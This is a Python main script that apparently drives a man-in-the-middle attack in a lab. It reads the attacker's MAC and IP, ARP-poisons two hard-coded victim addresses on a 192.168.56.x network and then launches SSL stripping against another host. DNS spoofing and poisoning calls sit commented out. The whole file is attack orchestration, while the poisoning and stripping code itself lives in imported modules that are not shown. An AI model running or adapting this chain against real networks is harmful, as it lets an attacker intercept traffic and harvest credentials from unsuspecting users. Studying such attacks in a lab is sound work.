import time

from arppoisoning import ArpPoisoning
from getmacipattacker import GetIpMac
from dnsspoofing import DnsSpoofing
#from dnspoisoning import DnsPoisoning
from sslstripping import SimpleSslStrip

#victim1
#macWindows = "08:00:27:b7:c4:af"
ip_victim_1 = "192.168.56.3"

#victim2
#macServer = "08:00:27:cc:08:6f"
ip_victim_2 = "192.168.56.103"

interface = "enp0s8"

global mac_attacker
global ip_attacker

if __name__ == "__main__":
    get_ip_mac_module = GetIpMac(interface)
    mac_ip_attacker = get_ip_mac_module.get_mac_ip()
    mac_attacker = mac_ip_attacker[0]
    ip_attacker = mac_ip_attacker[1]

    arp_poisoning_module = ArpPoisoning(ip_victim_1, ip_victim_2, mac_attacker, ip_attacker, interface)
    arp_poisoning_module.execute_poisoning()

    # dns_spoof_module = DnsSpoofing("192.168.56.102")
    # dns_spoof_module.execute_poisoning()

    ssl_strip_module = SimpleSslStrip("192.168.56.102")
    ssl_strip_module.execute_stripping()

    # dns_poisoning_module = DnsPoisoning(mac_attacker, ip_attacker, "192.168.56.102")
    # dns_poisoning_module.execute_poisoning()


